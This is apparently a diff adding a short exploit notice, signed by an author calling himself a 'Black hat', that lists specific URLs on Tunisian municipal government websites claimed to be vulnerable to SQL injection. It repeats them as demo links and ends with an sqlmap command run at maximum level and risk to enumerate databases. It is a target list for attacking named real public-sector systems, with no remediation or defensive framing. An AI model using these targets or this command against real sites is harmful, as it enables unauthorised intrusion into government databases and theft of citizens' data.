@@ -1,0 +1,46 @@
+#####################################################
+# Exploit : Gov.tn SQL Injection
+# 2020-9-16
+# Exploit Author: Sir-Majed
+# Category : Web Application Bugs
+# Tested on: windows 10
+#####################################################
+# Vulnerable file: NvCommunee.php?id+SessionPreliminaires.php+Investissements.php?id+SessionOrdinaires.php+Environnements.php?id+SessionExceptionnelles.php+nafadhh.php?id+Budgets.php?id+index.php?id+
+
+# http://www.commune-bemblamnara.gov.tn/ar/NvCommunee.php?id=[sql Injection]
+# http://www.commune-bemblamnara.gov.tn/ar/NvCommune/SessionPreliminaires.php?id=[sql Injection]
+# http://www.commune-souklahad.gov.tn/fr/NvCommune/Investissements.php?id=[sql Injection]
+# http://www.commune-sakietsidiyoussef.gov.tn/fr/NvCommune/SessionOrdinaires.php?id=[sql Injection]
+# http://www.commune-mazzouna.gov.tn/ar/NvCommune/Environnements.php?id=[sql Injection]
+# http://www.commune-souklahad.gov.tn/fr/NvCommune/Investissements.php?id=[sql Injection]
+# http://www.commune-mazzouna.gov.tn/ar/NvCommune/SessionExceptionnelles.php?id=[sql Injection]
+# http://www.commune-sened.gov.tn/ar/NvCommune/Investissements.php?id=[sql Injection]
+# http://www.commune-bekalta.gov.tn/ar/nafadhh.php?id=[sql Injection]
+# http://www.commune-meknassy.gov.tn/ar/NvCommune/Environnements.php?id=[sql Injection]
+# http://www.commune-bouhjar.gov.tn/ar/NvCommune/Budgets.php?id=[sql Injection]
+# http://www.grandprix-tunis.gov.tn/en/index.php?id=[sql Injection]
+# http://www.commune-meknassy.gov.tn/fr/NvCommune/Environnements.php?id=[sql Injection]
+
+#############################################################
+# Demo:
+http://www.commune-bemblamnara.gov.tn/ar/NvCommunee.php?id=1
+http://www.commune-bemblamnara.gov.tn/ar/NvCommune/SessionPreliminaires.php?id=1
+http://www.commune-souklahad.gov.tn/fr/NvCommune/Investissements.php?id=1
+http://www.commune-sakietsidiyoussef.gov.tn/fr/NvCommune/SessionOrdinaires.php?id=1
+http://www.commune-mazzouna.gov.tn/ar/NvCommune/Environnements.php?id=1
+http://www.commune-souklahad.gov.tn/fr/NvCommune/Investissements.php?id=1
+http://www.commune-mazzouna.gov.tn/ar/NvCommune/SessionExceptionnelles.php?id=1
+http://www.commune-sened.gov.tn/ar/NvCommune/Investissements.php?id=1
+http://www.commune-bekalta.gov.tn/ar/nafadhh.php?id=1
+http://www.commune-meknassy.gov.tn/ar/NvCommune/Environnements.php?id=1
+http://www.commune-bouhjar.gov.tn/ar/NvCommune/Budgets.php?id=1
+http://www.grandprix-tunis.gov.tn/en/index.php?id=1
+http://www.commune-meknassy.gov.tn/fr/NvCommune/Environnements.php?id=1
+
+##########################################################
+Pc: sqlmap -u pago  --level=5 --risk=3 --dbs --banner --batch
+#####################################################
+# Sir-Majed
+# Twitter:@mm4xm
+# Black hat
+#####################################################
